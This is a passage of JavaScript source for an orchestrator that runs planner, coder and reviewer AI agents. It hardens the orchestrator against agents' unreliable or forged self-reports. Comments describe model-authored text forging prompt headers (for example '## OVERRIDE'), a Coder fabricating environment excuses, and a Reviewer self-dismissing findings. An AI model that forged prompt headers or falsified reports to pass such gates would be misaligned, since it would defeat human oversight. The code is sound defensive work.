// carrying a prior thinking block back in its history. Nothing about the prompt
// causes it (~25k of a 200k window), so trimming the input would not have
// helped. See issue #4. Either model is one `config.models` line away for an
// operator who has the route and wants it; neither is something to hand every
// project by default.
const DEFAULT_MODELS = {
  trivial: { planner: 'opus', coder: 'opus', reviewer: 'sonnet', reviewerFix: 'sonnet', security: 'opus', researcher: 'sonnet', recorder: 'sonnet' },
  medium:  { planner: 'opus', coder: 'opus', reviewer: 'sonnet', reviewerFix: 'sonnet', security: 'opus', researcher: 'opus',   recorder: 'sonnet' },
  complex: { planner: 'opus', coder: 'opus', reviewer: 'sonnet', reviewerFix: 'sonnet', security: 'opus', researcher: 'opus',   recorder: 'sonnet' },
}

// Merges per ROLE, not per tier: an operator overriding one role must not
// silently unset the rest of that row. A tier-level spread leaves every role
// they didn't name undefined, and only the recorder has a hardcoded fallback
// to catch it — the others reach the harness with no model at all.
// Pure on purpose: it returns warnings instead of logging them, so
// scripts/check-model-table.sh can brace-extract it and drive the real merge
// standalone.
function mergeModelTable(defaults, override) {
  const table = {}
  const warnings = []
  const tiers = Object.keys(defaults)
  for (const tier of tiers) {
    const row = { ...defaults[tier] }
    const roles = Object.keys(defaults[tier])
    for (const role of roles) {
      const value = override?.[tier]?.[role]
      if (value === undefined) continue
      // A model name goes to the harness as `model:` verbatim, so anything
      // that isn't a usable name is rejected here rather than forwarded and
      // failing six attempts later with the operator's typo nowhere in sight.
      if (typeof value === 'string' && value.trim()) row[role] = value
      else warnings.push(`config.models.${tier}.${role} is invalid (${JSON.stringify(value)}) — expected a model name string. Keeping default ${defaults[tier][role]}`)
    }
    for (const key of Object.keys(override?.[tier] || {})) {
      // Same reason the stallMs merge warns on an unrecognised role: a key the
      // loop above never visits is silently discarded, and the operator
      // believes they routed a role.
      if (!roles.includes(key)) warnings.push(`config.models.${tier}.${key} is not a known role — ignored. Roles: ${roles.join(', ')}`)
    }
    table[tier] = row
  }
  for (const key of Object.keys(override || {})) {
    if (!tiers.includes(key)) warnings.push(`config.models.${key} is not a known complexity tier — ignored. Tiers: ${tiers.join(', ')}`)
  }
  return { table, warnings }
}

function routeModels(complexity) {
  return MODEL_TABLE[complexity] || MODEL_TABLE.medium
}

// The exact string Claude Code 2.1.239 throws when its watchdog gives up:
// 'agent stalled on all 6 attempts (no progress for 180000ms each)'. Matched
// on the harness's own vocabulary rather than the literal sentence, so a
// reflowed wording still matches. Three deliberate tightenings: the gap is
// bounded and lazy (an unbounded greedy `.*` backtracks quadratically, and
// this runs on a failure path where the payload may be a dumped stack), it
// can't cross a sentence boundary, and it requires the trailing `for <n>ms`
// — without that, ordinary prose like 'work stalled because there was no
// progress on the API contract' matches, and since isStallError now gates
// the model fallback, a false positive denies a genuinely failed model its
// fallback: the exact behaviour this fix exists to prevent, inverted.
const STALL_ERROR_RE = /\bstalled\b[^.]{0,200}?\bno progress for \d+\s*ms/i

function isStallError(err) {
  // Sliced as well as bounded: the regex is linear now, but there's no reason
  // to hand a megabyte-long error payload to it.
  return STALL_ERROR_RE.test(String(err?.message || err || '').slice(0, 2000))
}

// The single point every agent() call funnels through, so a stall can only be
// explained once instead of re-diagnosed (or missed) at each of the six call
// sites. Never absorbs: a stall is logged and rethrown, everything else is
// rethrown untouched — a catch that swallowed either would look like a fix
// and would silently convert a stalled Planner into a bare "Planner failed".
//
// stallMs is undocumented in Claude Code 2.1.239 — it appears only as a
// binary constant (`Ue = we?.stallMs != null ? Number(we.stallMs) : _vw`,
// with `_vw = 180000`), which is where issue #3 found it; nothing in the
// published docs mentions the key. Both
// failure directions degrade safely rather than break: a future harness that
// ignores the key just falls back to its own 180000 default, i.e. today's
// behaviour before this change; a harness whose stall message wording changes
// just stops matching STALL_ERROR_RE, so the generic ERROR line at
// runOneFeature's catch still prints instead of a wrapper throwing on an
// unrecognised shape.
async function runAgent(prompt, opts) {
  // Bracketed here rather than at each call site because this is the single
  // funnel: agentWithRetry and agentWithModelFallback both re-enter through it,
  // so a retry gets its own ledger entry instead of overwriting the first
  // attempt's. `ledger` is orchestrator-side bookkeeping, not an agent option —
  // it is destructured out so a closure-bearing object never reaches the
  // harness call, which serialises what it is handed.
  const { ledger, ...agentOpts } = opts || {}
  const closeCost = ledger ? ledger.open(opts.phase, opts.label) : null
  try {
    return await agent(prompt, agentOpts)
  } catch (err) {
    if (!isStallError(err)) throw err
    // Line 1: what actually happened — the agent was generating, not hung.
    // Claude Code's watchdog counts only tool_use blocks as progress, so
    // composing one large structured output (a long plan, a verdict with
    // full verification + attacks) is indistinguishable from a stall until
    // it's already been aborted six times.
    log(`  ✗ ${opts.label} stalled — it was generating a large response, not hung. Claude Code's watchdog only counts tool calls as progress; composing a big structured output looks identical to hanging.`)
    log(`  ✗ ${opts.label} current budget: ${opts.stallMs}ms. Raise it with config.stallMs.<role> if this keeps happening.`)
    if (opts.label?.endsWith('planner')) {
      log(`  ✗ ${opts.label}: a smaller brief produces a smaller plan, which fits inside the window — that lever is the operator's, not this pipeline's.`)
    }
    throw err
  } finally {
    // In `finally`, not after the await: an agent that stalled or threw still
    // burned the output tokens it produced before dying, and that is the run an
    // operator most wants the figure for.
    if (closeCost) closeCost()
  }
}

// One transient failure shouldn't abort a run that has already done real work
async function agentWithRetry(prompt, opts, attempts = 2) {
  for (let i = 0; i < attempts; i++) {
    const result = await runAgent(prompt, opts)
    if (result) return result
    if (i < attempts - 1) log(`  ↻ ${opts.label} returned nothing — retrying (${i + 2}/${attempts})`)
  }
  return null
}

// 'fable' isn't on every proxy route. When the reviewer's model has an entry
// here, an unavailable primary (the call returns nothing, or throws) retries
// once on the fallback instead of the run failing outright — a weaker review
// still catches things; no review is what a run can't recover from.
const REVIEWER_FALLBACK = { fable: 'sonnet' }

function logUnproven(verdict, logPrefix) {
  if (!verdict.unproven?.length) return
  log(`${logPrefix}  ⚠ NOT PROVEN — ${verdict.unproven.length} criterion(s) skipped, over to you:`)
  verdict.unproven.forEach(c => log(`${logPrefix}    ○ ${c}`))
}

// A criterion the Reviewer marked `skipped` is work handed back to the operator —
// typically the one check too expensive to finish inside a single tool call. Nothing
// in VERDICT_SCHEMA couples that to `status`, so a verdict could come back `approved`
// with its most expensive criterion silently unproven, and the word "approved" carried
// no sign of it. Couple them here rather than asking the Reviewer to self-report: an
// omission is exactly what a model is least reliable at volunteering.
function markUnproven(verdict) {
  const criteria = Array.isArray(verdict.verification?.criteria) ? verdict.verification.criteria : []
  const unproven = criteria.filter(c => c?.status === 'skipped')
  if (!unproven.length) return verdict

  const names = unproven.map(c => c.criterion)
  return {
    ...verdict,
    verification: {
      ...verdict.verification,
      // 'verified' asserts every criterion was proven; a skip makes that false.
      verdict: verdict.verification.verdict === 'failed' ? 'failed' : 'partial',
    },
    unproven: names,
    summary: `${verdict.summary}\n\nNOT PROVEN — ${names.length} criterion(s) skipped, left for the operator to run: ${names.join('; ')}`,
  }
}

// Scoped runs mean an approved verdict can rest on nothing wider than the
// files this run touched, and `approved: true` alone cannot express that. An
// enum rather than a boolean for the same reason record_status is one:
// `full_suite: false` is satisfied identically by a crashed Coder, by a
// deliberate fullSuiteAt 'never', and by a run that deferred to ship, and
// those are three different facts to whoever reads the result.
// Reference-identical on the 'ran' path, like enforceVerificationGate and
// enforceMigrationGate: call sites detect a gate firing by identity, so an
// unconditional spread here would read as "fired" on every clean run.
// This annotates and never blocks — the point is a fact carried honestly, not
// a fourth gate.
const FULL_SUITE_REASONS = {
  not_run: 'no Coder pass reported running it',
  disabled: "config.tests.fullSuiteAt is 'never' — the operator owns this gate",
  deferred_to_ship: "config.tests.fullSuiteAt is 'ship' — /ldo-ship must run it before merge",
}

function markFullSuite(verdict, status) {
  if (status === 'ran') return verdict
  const reason = FULL_SUITE_REASONS[status] || status
  return {
    ...verdict,
    full_suite: status,
    summary: `${verdict.summary}\n\nFULL SUITE NOT RUN — ${reason}; only the files this run touched were tested, so a cross-module regression could not have been caught.`,
  }
}

// Same contract as markFullSuite — annotates, never blocks, reference-identical
// on the no-op path so a call site can't read it as having fired — but applied
// at the opposite end of the run, and that asymmetry is the point. markFullSuite
// runs BEFORE phaseRecord so its sentence reaches the persisted review report;
// this one can only run after, and there is nothing to persist it into: the
// whole reason it fires is that no report was written. So the returned object
// is the only place an operator can learn it, which is why the sentence spells
// out which three artifacts are missing rather than just naming the status.
// `approved` is computed upstream from the suite-marked verdict and must not be
// recomputed from this one — a failed Recorder says nothing about the code.
function markRecordFailed(verdict, recordStatus) {
  if (recordStatus !== 'failed') return verdict
  return {
    ...verdict,
    summary: `${verdict.summary}\n\nRECORD NOT PERSISTED — the Recorder returned nothing; the review report, architecture doc and backlog for this run were not written. The verdict above is unchanged.`,
  }
}

// A fresh worktree brings nothing gitignored with it — no .venv, no
// node_modules, no .env — so a Coder rebuilds the environment from whatever
// install command it can find, and the most obvious command is often not the
// project's real one (`pip install -e .` where the suite needs `.[dev,test]`).
// The run then reports approved:false on code that was correct, with nothing in
// the result saying the environment was the variable rather than the diff.
//
// Three states rather than a boolean, for the record_status reason: `false`
// is satisfied identically by "the environment was fine" and by "we never
// found out", and a failure indistinguishable from success in the result
// object gets read as success.
//
// This is the one thing here derived from what the Coder says about itself
// rather than from a fact the orchestrator holds — a Coder could fabricate
// `env.unresolved` to excuse a rejection, or omit it to hide one. That is
// precisely why it may only ever annotate: it is applied to a run that was
// already NOT approved, and it never touches `status`.
function deriveEnvStatus(coderResult) {
  const unresolved = (Array.isArray(coderResult?.env?.unresolved) ? coderResult.env.unresolved : [])
    .map(u => collapseLines(u))
    .filter(Boolean)
  const baseline = coderResult?.tests?.baseline
  const captured = baseline?.captured === true
  const failing = Array.isArray(baseline?.failing) ? baseline.failing : []
  const preExisting = Array.isArray(coderResult?.tests?.pre_existing_failures) ? coderResult.tests.pre_existing_failures : []
  // "Everything that was broken before is still broken" plus an unresolved
  // environment is the signature of a suite that never had what it needed,
  // rather than of a change that broke something.
  const nothingImproved = captured && failing.length > 0 && preExisting.length >= failing.length
  const status = unresolved.length && (!captured || nothingImproved)
    ? 'unreproducible'
    : captured ? 'ok' : 'unknown'

  const why = captured
    ? `every failure that predated the first edit still fails (${preExisting.length} of ${failing.length})`
    : `no test baseline could be captured (${collapseLines(baseline?.note) || 'no reason given'})`
  return { status, unresolved, evidence: collapseLines([why, ...unresolved.slice(0, 3)].join('; ')) }
}

// Follows the markFullSuite convention exactly, including reference identity on
// the pass path: call sites in this file detect a marker firing by `!==`, so an
// unconditional spread would read as "fired" on every clean run.
function markEnvUnreproducible(verdict, env) {
  if (env?.status !== 'unreproducible') return verdict
  return {
    ...verdict,
    env_status: env.status,
    summary: `${verdict.summary}\n\nENVIRONMENT NOT REPRODUCED — ${env.evidence}; the tests behind this verdict ran in an environment the Coder could not reproduce, so this result may be about the environment rather than the code.`,
  }
}

// `ran: true` is a model reporting on its own behaviour, and markUnproven
// exists because that is exactly what a model is least reliable at. Corroborate
// it: a pass that genuinely ran the suite has a command and a result to show
// for it, and a claim with neither is downgraded to not_run.
function fullSuiteRan(tests) {
  const fs = tests?.full_suite
  if (!fs || fs.ran !== true) return false
  return typeof fs.command === 'string' && fs.command.trim() !== '' && typeof fs.result === 'string' && fs.result.trim() !== ''
}

// An issue's identity is the file it names plus the Reviewer's prose describing
// it, and that prose is model-authored free text. Run wf_2b451aee-6ea re-raised
// the same critical on its fix pass in different words, the verbatim key missed,
// downgradeUnrelatedFindings reclassified a still-open blocker as an unrelated
// advisory, and the run reported approved on a zero-line diff. So identity is a
// canonicalized key plus a similarity test, not string equality on prose.
//
// The threshold is measured, not chosen. Over 18 run journals, 121 pairs of
// issues raised in the SAME round on the SAME file — distinct defects by
// construction — score at most 0.439 Dice over distinct normalized tokens,
// while the real re-worded pair scores 0.824. 0.45 sits just above that
// measured ceiling and false-matches none of the 121; at 0.40 one of them
// already does, so lowering it is not an improvement.
//
// What this does NOT catch: a rewording sharing under 45% of its tokens still
// produces a different key and is still missed — a measured 8-token restatement
// of a 24-token finding scores 0.250. enforceVerificationGate is the
// independent backstop for that case; this only reduces how often it is needed.
//
// The failure direction is one-way on purpose. A false match reads as ALREADY
// SENT and keeps the finding blocking, costing at worst a fix pass; a missed
// match downgrades a live blocker, which is the direction that approves nothing.
//
// The 2000-char cap bounds regex cost over model-authored text rather than
// meaning anything semantically: 0ms capped vs 84ms uncapped on an 800k-char
// adversarial input, and this file has already shipped a quadratic-backtracking
// defect in exactly this position (STALL_ERROR_RE).
const normalizeWhat = what => String(what ?? '').slice(0, 2000).toLowerCase().replace(/[^a-z0-9]+/g, ' ').trim()

const issueKey = iss => `${iss.file}::${normalizeWhat(iss.what)}`

// `keys` is a Set or Map of canonical keys. Anything else throws on `.has` at
// the first call rather than scoring against a shape it cannot read — a silent
// zero here would mean "never matched", the direction that stops blocking.
const matchIssueKey = (iss, keys) => {
  const exact = issueKey(iss)
  if (keys.has(exact)) return exact

  const cut = exact.indexOf('::')
  const file = exact.slice(0, cut)
  const tokens = new Set(exact.slice(cut + 2).split(' ').filter(Boolean))

  let best = null
  let bestScore = 0
  for (const key of keys.keys()) {
    const kcut = key.indexOf('::')
    // Same file only: identical prose about two different files is two issues.
    if (key.slice(0, kcut) !== file) continue
    const other = new Set(key.slice(kcut + 2).split(' ').filter(Boolean))
    let shared = 0
    for (const t of tokens) if (other.has(t)) shared++
    const total = tokens.size + other.size
    const score = total ? (2 * shared) / total : 0
    if (score > bestScore) {
      bestScore = score
      best = key
    }
  }
  return bestScore >= ISSUE_MATCH_THRESHOLD ? best : null
}

// Model-authored text that gets quoted into ANOTHER agent's prompt goes
// through this first. Collapsing newlines is the same hardening phaseRecord
// applies to issue prose — a `\n## SECTION` inside a free-text field otherwise
// forges a header in the prompt it lands in — and the leading-`#` strip closes
// the same hole for a string that starts as a heading, including one a
// truncation could leave mid-way. The length cap is what keeps an unbounded
// model-authored array from dominating the prompt it is quoted into; the text
// here is a claim to check against the code, never the evidence itself, so
// losing the tail of a long one costs nothing.
//
// The step order is load-bearing. Trim BEFORE the strip: leading whitespace
// hides the `#` from `^`, and the trim would then promote it back to position
// zero of a rendered line. The strip eats runs of `#` and whitespace together,
// so `# ## X` cannot leave a second heading behind. Truncation stays last — a
// slice of a string that no longer starts with `#` cannot create one.
//
// `\n` is not the only line ending. A lone `\r` is a line terminator to
// CommonMark and to most renderers, and U+2028/U+2029 are line terminators to
// JavaScript itself, so `x\r## OVERRIDE` forges a header exactly the way
// `x\n## OVERRIDE` does. U+0085 (NEL) is in the class because JS `\s` does not
// match it — the surrounding `\s*` can absorb the `\r` of a CRLF but never a
// NEL. One shared const for every collapse site, so the next one cannot quietly
// regress to `\n`-only; it is used only with `String.replace`, which resets
// `lastIndex` itself, so the `g` flag carries no state between callers.
const LINE_BREAK_RUN = /\s*[\r\n\u2028\u2029\u0085\v\f]+\s*/g
const PROMPT_TEXT_MAX = 200
const collapseLines = (x, max = PROMPT_TEXT_MAX) => {
  const s = String(x ?? '').replace(LINE_BREAK_RUN, ' ').trim().replace(/^[#\s]+/, '')
  return s.length > max ? `${s.slice(0, max)}…` : s
}

// Rendered lists of model-authored entries are capped and say how much they
// dropped, rather than truncating silently — the same reason partitionTestPaths
// reports what it excluded.
// One line, not wrapped: the gate scripts brace-extract declarations by walking
// to the first newline at depth zero, and a wrapped arrow body ends at the `=>`.
const RENDER_LIST_MAX = 10
const capList = (lines, max = RENDER_LIST_MAX) => lines.length > max ? [...lines.slice(0, max), `+${lines.length - max} more`] : lines

// ── supplied-artifact detection ─────────────
//
// Issue #19: a brief pasted an operator's DDL, said in its own prose to discard
// the ACL it carried, and quoted a trust contract forbidding allow-lists. The
// Planner carried `is_allowed` through into the plan and into a generated chunk
// task, because nothing anywhere asked it to reconcile the artifact against the
// two things contradicting it. The reconciliation brief is the fix; this scan
// decides when to pay for it.
//
// The list is deliberately narrow, and each marker names a shape only a brief
// that SUPPLIES something can have. A task with no artifact — "increase the
// retry timeout from 30s to 60s" — matches nothing and adds not one byte to the
// Planner prompt, which is the whole reason detection exists instead of an
// unconditional block. Widening it is not free: every added pattern moves more
// ordinary bug fixes onto the paying path, so measure a plain one-liner against
// it before adding one.
//
// Every pattern is linear with no nested and no ambiguous quantifier: this runs
// over operator-pasted text of unbounded length, and a `[\w.]+\.` style prefix
// would backtrack quadratically on a long run of punctuation.
const ARTIFACT_MARKERS = [
  ['fenced_block', /```/],
  ['ddl', /\b(?:create|alter|drop)\s+(?:table|index|view|type|schema)\b/i],
  ['endpoints', /\b(?:GET|POST|PUT|PATCH|DELETE)\s+\//],
  ['document_reference', /\w\.(?:md|sql|ya?ml|json|toml|proto|graphql|csv|ini)\b/i],
  ['artifact_keyword', /\b(?:requirements?\s+doc(?:ument)?|design\s+doc(?:ument)?|DDL|schema|OpenAPI|swagger|protobuf|API\s+shape|endpoint\s+list|config\s+block|salvage|legacy\s+client)\b/i],
]

function detectSuppliedArtifact(task) {
  const text = String(task ?? '')
  return ARTIFACT_MARKERS.filter(([, re]) => re.test(text)).map(([name]) => name)
}

// Three states, not a boolean: "the task supplied nothing to reconcile" and
// "the task supplied something and the Planner reported no contradiction and no
// NONE line" are the two the operator most needs to tell apart, and a boolean
// collapses them into the same silence.
function reconciliationStatus(task, plan) {
  if (!detectSuppliedArtifact(task).length) return 'not_triggered'
  const conflicts = Array.isArray(plan?.conflicts) ? plan.conflicts : []
  return conflicts.some(c => String(c ?? '').trim()) ? 'reported' : 'expected_not_reported'
}

function renderReconciliationBrief(markers) {
  if (!markers?.length) return ''
  return [
    '## SUPPLIED ARTIFACT — RECONCILE BEFORE PLANNING',
    `This brief supplies a concrete artifact — detected: ${markers.join(', ')}. Before you plan from it, reconcile it, as agents/planner.md section 1.6 describes.`,
    'Both directions are required. Check the artifact against every relevant project contract or design document you read, and check the artifact against the brief\'s own prose — one part of a brief routinely contradicts an artifact pasted into another part, and that needs no contract at all to see.',
    'Report every contradiction you find as one `conflicts` entry naming both sides and where each came from, plus the decision the operator has to confirm.',
    'Do not stop, do not ask, and do not resolve a contradiction by quietly picking a side — dropping the disputed element is exactly as bad as keeping it, because the operator has to see that a choice existed. Plan on, and say in the affected step which side you planned from.',
    'If you reconciled and found nothing, say so as a single entry beginning `NONE —`. An empty `conflicts` on a brief that supplied an artifact is read as not reconciled at all.',
    '',
    '',
  ].join('\n')
}

// A Reviewer writes `workflows/ldo.js`, `./workflows/ldo.js`,
// `workflows/ldo.js:120` or the linter/compiler form `workflows/ldo.js:120:5`;
// a Coder inside a worktree reports the absolute path for the same file.
// The trailing-line-reference strip is `(:\d+(-\d+)?)+$`, repeating, not a
// single group: a once-only strip takes `:5` off `file.js:120:5` and leaves
// `file.js:120`, which is exactly the silent non-match this comment warns about. Every one of those has to reduce to the same string, or
// the attribution test below silently never matches and reinstates the exact
// behaviour it exists to replace. `.` and `..` segments are resolved textually
// (no fs access — the file may not exist on the reviewing machine, and a
// realpath call would follow symlinks out of the worktree), repeated slashes
// collapse, and a whitespace-only or purely relative value reduces to the
// empty string so sameFilePath can reject it outright.
const normalizeIssuePath = p => {
  const raw = String(p ?? '')
    .trim()
    .replace(/\\/g, '/')
    .replace(/(:\d+(-\d+)?)+$/, '')
  const parts = []
  for (const seg of raw.split('/')) {
    if (seg === '' || seg === '.') continue
    if (seg === '..') { parts.pop(); continue }
    parts.push(seg)
  }
  return parts.join('/')
}

// Exact or path-suffix, never `includes()` — same reasoning as
// verifyAgentLocation: a bare `ldo.js` must not match `workflows/ldo.js` by
// shared text, and `src/a.js` must not match `vendor/src/a.js`. Both suffix
// directions are tested because either side can be the longer form (an
// absolute Coder path against a relative Reviewer one, or the reverse).
// A degenerate operand is rejected rather than compared: `''`, `.`, `..`, `/`
// and whitespace all normalize to the empty string, and `endsWith('/' + '')`
// is true for every path — which would silently keep every finding blocking
// on one side and match nothing on the other. This control fails OPEN by
// construction (a non-match downgrades a live blocker), so the degenerate case
// is the one that must not be guessed at.
const sameFilePath = (a, b) => {
  const x = normalizeIssuePath(a)
  const y = normalizeIssuePath(b)
  if (!x || !y) return false
  return x === y || x.endsWith(`/${y}`) || y.endsWith(`/${x}`)
}

// The first review is the full-scrutiny gate; a fix pass is narrow by
// construction — it only asked the Coder to touch specific files, so a fresh
// `major` the Reviewer didn't attribute to that work is a pre-existing defect,
// not a regression. Restarting the loop for it is how a run stops being able
// to finish: the field case was a feature never approved across three rounds
// despite each round's own prose saying the work was done. Decided here rather
// than asked of the Reviewer, same reason as markUnproven — an omission
// (forgetting to mark `introduced_by_fix`) is what a model is least reliable
// at volunteering, and a conscientious model will over-mark rather than
// under-mark if the incentive is "mark it or it gets ignored". A regression
// the fix actually caused keeps its severity and still blocks; a re-raised
// issue from the verification list is untouched; first-pass reviews never
// call this at all.
// Returns { verdict, downgraded } rather than a verdict alone. `downgraded` is
// a Map from issue key to the pass number that downgraded it, computed here by
// the orchestrator from what THIS call actually did — it is the only thing any
// downstream blocking test or report may consult. Nothing downstream reads a
// field off the issue objects themselves: `advisory` and `downgrade_reason`
// live on model-authored JSON (a Reviewer verdict, not orchestrator state) and
// are not in VERDICT_SCHEMA, so a Reviewer is free to write them in. They are
// stripped from every issue here and re-set only on the ones this function
// downgrades, so the raw verdict an operator reads can't carry a self-declared
// dismissal either.
// Membership against `sentKeys` is a fuzzy match (see matchIssueKey), and only
// in the safe direction: an over-eager match keeps a finding blocking, the same
// fail-safe this comment already commits to, while a missed match is what lets
// a live blocker be reclassified as unrelated.
//
// Two escapes above and beyond `introduced_by_fix`, because that flag is the
// model-authored one this comment already says cannot be relied on:
//
// `changedFiles` is the fix pass's own `files_changed` — a fact the Coder
// reports about the edits it just made, attributable by construction rather
// than by a judgement call about causation. A blocking finding in a file this
// pass had its hands in stays blocking whether or not the Reviewer thought to
// attribute it. Matching is fail-safe in the same direction as everything else
// here: an over-eager path match keeps a finding blocking and costs a fix pass,
// a missed one downgrades a live blocker.
//
// A `critical` is never downgradeable at all. The termination rationale above
// is worth a `major` riding along as advisory in the report — it is not worth a
// `critical` written off, which is precisely the wf_2b451aee false-approval
// class: a live critical reclassified as unrelated and the run reported
// approved on a zero-line diff. enforceMigrationGate and enforceVerificationGate
// inject their findings AS `critical` for the same reason — that severity is
// the one thing in this pipeline that must not be bypassable. The cost is a run
// that can spend all three loops on a pre-existing critical the fix pass walked
// past; MAX_FIX_LOOPS still terminates it, and the exhausted-run path already
// reports closed-versus-still-open separately.
function downgradeUnrelatedFindings(verdict, sentIssues, iteration, changedFiles = []) {
  const sentKeys = new Set(sentIssues.map(issueKey))
  // Defaulted, not required: the existing three-argument call shape is what the
  // gate script drives, and a first pass has no fix to attribute anything to.
  const touched = (Array.isArray(changedFiles) ? changedFiles : []).map(normalizeIssuePath).filter(Boolean)
  const names = []
  const downgraded = new Map()

  const issues = (verdict.issues || []).map(raw => {
    const { advisory, downgrade_reason, ...iss } = raw
    const isBlockingSeverity = BLOCKING_SEVERITIES.includes(iss.severity)
    const key = issueKey(iss)
    const wasSent = matchIssueKey(iss, sentKeys) !== null
    const inTouchedFile = touched.some(f => sameFilePath(iss.file, f))
    // Strict === true, not truthy — a Reviewer that marks everything true
    // keeps the loop blocking (fail-safe), never bypasses it; a stray string
    // must not widen the check.
    if (!isBlockingSeverity || wasSent || iss.introduced_by_fix === true || iss.severity === 'critical' || inTouchedFile) return iss

    names.push(`[${iss.severity}] ${iss.file}: ${iss.what}`)
    downgraded.set(key, iteration)
    return { ...iss, advisory: true, downgrade_reason: `new in fix pass ${iteration}, not marked introduced_by_fix, not critical, and not in a file this pass changed` }
  })

  if (!names.length) return { verdict: { ...verdict, issues }, downgraded }

  return {
    verdict: {
      ...verdict,
      issues,
      summary: `${verdict.summary}\n\nDOWNGRADED TO ADVISORY — ${names.length} issue(s) new in this fix pass, not on the verification list, not marked introduced_by_fix, not critical, and not in any file this fix pass changed: ${names.join('; ')}`,
    },
    downgraded,
  }
}

// A fix pass that fixed one of three issues and one that fixed all three used
// to produce the identical result object: `files_changed` plus a summary, with
// nothing tying an edit to the issue it answers. So every issue sent to a fix
// pass now owes an entry, and the check lives here rather than in the
// Reviewer's judgement for the same reason markUnproven does — the
// orchestrator holds both sides (what it sent, what came back), and an
// omission is what a model is least reliable at volunteering about itself.
//
// The 50-entry slice and the collapseLines cap are not cosmetic: `issue_outcomes`
// is model-authored and matchIssueKey is a bigram similarity run for every sent
// issue against every entry, so both the CPU cost and the size of the prompt
// block built from it would otherwise scale with whatever the Coder emits.
//
// matchIssueKey runs INVERTED here relative to every other use of it. Elsewhere
// a false match keeps a finding blocking (fail-safe); here a false match marks
// an issue accounted for. That inversion is exactly why the result may only
// ever produce a warning — see the call site in phaseCodeReview for why this
// never gates a verdict.
const MAX_ISSUE_OUTCOMES = 50

function accountIssueOutcomes(sentIssues, coderResult) {
  const raw = Array.isArray(coderResult?.issue_outcomes) ? coderResult.issue_outcomes : []
  const entries = raw
    .filter(e => e && typeof e === 'object')
    .slice(0, MAX_ISSUE_OUTCOMES)
    .map(e => ({
      file: collapseLines(e.file),
      issue: collapseLines(e.issue),
      outcome: collapseLines(e.outcome, 20),
      detail: collapseLines(e.detail),
    }))
  const keys = new Set(entries.map(e => issueKey({ file: e.file, what: e.issue })))
  const sent = Array.isArray(sentIssues) ? sentIssues : []
  return {
    entries,
    unaccounted: sent.filter(iss => matchIssueKey(iss, keys) === null),
    notFixed: entries.filter(e => e.outcome !== 'fixed'),
  }
}

// The header names what the block is. `fixed` is the Coder reporting on its own
// work — the work the Reviewer is being asked to judge — so a Reviewer reading
// it as "closed" would close a finding on the word of the agent under review.
function renderAccounting(entries, unaccounted) {
  if (!entries.length && !unaccounted.length) return ''
  const section = (title, lines) => `${title}\n${lines.length ? capList(lines).join('\n') : 'none'}`
  const fixed = entries.filter(e => e.outcome === 'fixed').map(e => `${e.file}: ${e.issue}`)
  const open = entries.filter(e => e.outcome !== 'fixed').map(e => `[${e.outcome}] ${e.file}: ${e.issue}${e.detail ? ` — ${e.detail}` : ''}`)
  const missing = unaccounted.map(iss => `${collapseLines(iss.file)}: ${collapseLines(iss.what)}`)
  return `\n\n## THE CODER'S OWN ACCOUNTING (unverified claims by the Coder — verify each against the code; nothing here closes an issue)
${section('Reported fixed:', fixed)}

${section('Reported not fixed or blocked:', open)}

${section('Sent to the fix pass but not accounted for at all:', missing)}`
}

// A fix pass sees only the issues it was sent, so it has no way of knowing that
// the thing it is about to "simplify" is a defect an earlier pass in this same
// run already closed — which is how a three-round loop can spend rounds two and
// three undoing round one. resolvedIssues is the orchestrator's own record of
// what stopped being re-raised, so the list is derived, not asked for.
function renderResolved(resolvedIssues) {
  const list = Array.isArray(resolvedIssues) ? resolvedIssues : []
  if (!list.length) return ''
  const lines = list.map(iss => `[${collapseLines(iss.severity, 20)}] ${collapseLines(iss.file)}: ${collapseLines(iss.what)} (closed in pass ${collapseLines(iss.resolved_in_pass, 8)})`)
  return `\n\n## ALREADY CLOSED IN THIS RUN — DO NOT REINTRODUCE\n${capList(lines).join('\n')}`
}

// Verifies a self-reported location against the location the pipeline told the
// agent to be in — used for both the Recorder (workflows/ldo.js:phaseRecord)
// and the Reviewer (workflows/ldo.js:phaseCodeReview). This is honesty-of-report,
// not location-of-write: it checks what the agent says it saw, not what actually
// happened on disk, so it reliably catches "forgot to cd and honestly reported
// where it was" but is not a containment boundary against a model that
// misreports. That's the actual failure mode observed in the field (a weak
// model losing a prompt-only instruction), so it's worth building for even
// though it isn't a guarantee.
function verifyAgentLocation(reportedRoot, plan, ctx) {
  if (!ctx?.isMulti) return false
  // `git rev-parse --show-toplevel` — what both schemas ask the agent to
  // report verbatim — ends in a newline, and stray leading/trailing spaces
  // are just as plausible from a model's text output. Trim before
  // normalising, or a fully compliant report false-positives as misplaced.
  const wp = String(plan?.worktree_path || '').trim().replace(/\/+$/, '').replace(/^\.\//, '')
  const root = String(reportedRoot || '').trim().replace(/\/+$/, '')
  if (!wp || !root) return false
  // Exact match or path-suffix only — never includes(), which would let
  // `.worktrees/1-foo-evil` pass against `.worktrees/1-foo`.
  return root !== wp && !root.endsWith('/' + wp)
}

// A number claimed by two migrations means undefined apply order and a
// possibly broken schema — before this gate, only a human eye at merge time
// caught it. Enforced here, not asked of the Reviewer's self-report, because
// an omitted check is exactly what a model is least reliable at volunteering:
// it's easy to forget to run and cheap to skip silently, and "I didn't check"
// looks identical to "approved" unless something downstream refuses to accept it.
function enforceMigrationGate(verdict, plan) {
  if (!(plan?.migrations?.count > 0)) return verdict

  const c = verdict.migrations_check
  // The plan is the authority on whether migrations exist, so a Reviewer
  // reporting `not_applicable` here is always a contradiction, not a valid
  // outcome — treat it the same as a missing check rather than letting it
  // bypass the gate.
  if (c?.status === 'ok') return verdict

  // The schema declares `collisions`/`created` as arrays, but that's a hint
  // to the model, not a runtime guarantee — a single collision is exactly
  // the shape a model tends to fill with a lone string instead of a
  // one-element array. Coerce rather than crash: the safe direction on a
  // malformed report is to keep the gate blocking, not to abort the run.
  const list = a => (Array.isArray(a) ? a : a ? [String(a)] : [])

  const what = c?.status === 'collision'
    ? `Migration numbering collision: ${list(c.collisions).join(', ') || '(no numbers listed)'}`
    : c?.status === 'mismatch'
      ? `Migration count/identifier mismatch — declared ${plan.migrations.count}, created ${list(c.created).join(', ') || '(not reported)'}`
      : c?.status === 'not_applicable'
        ? 'migrations_check reported not_applicable, but the plan declares migrations — the plan is authoritative, so this is treated as an unrun check'
        : 'migrations_check was not run — the plan declared migrations but the Reviewer never ran the collision/count check'

  const issue = {
    file: plan.migrations.directory,
    severity: 'critical',
    what,
    suggestion: c?.status === 'collision'
      ? 'Renumber the colliding migration(s) inside the declared range so no identifier is claimed twice.'
